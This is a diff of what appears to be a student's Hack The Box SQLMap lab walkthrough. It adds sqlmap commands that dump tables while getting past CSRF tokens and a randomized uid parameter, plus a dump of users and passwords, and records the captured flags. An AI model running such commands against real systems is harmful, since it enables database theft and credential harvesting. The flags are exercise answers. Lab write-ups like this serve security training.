@@ -28,9 +28,12 @@ sqlmap -u 94.237.63.201:36417" --dump users --passwords crawl=2
 
 ```bash
 # What's the contents of table flag8? (Case #8)
-sqlmap IP/case8.php -T flag8 --data="id=1&csrf-token=" --csrf-token="csrf-token" --batch --crawl=2
+sqlmap -u 83.136.254.233:59619/case8.php -T flag8 --batch --dump --csrf-token="t0ken" --crawl=2 --forms --random-agent 
+# HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}
 
 # What's the contents of table flag9? (Case #9)
+sqlmap -u " 83.136.254.233:59619/case9.php/id=1&uid=4118292662" -T flag9 --batch --dump --randomize=uid --crawl=2 --random-agent
+# HTB{700_much_r4nd0mn355_f0r_my_74573}
 
 # What's the contents of table flag10? (Case #10)
 
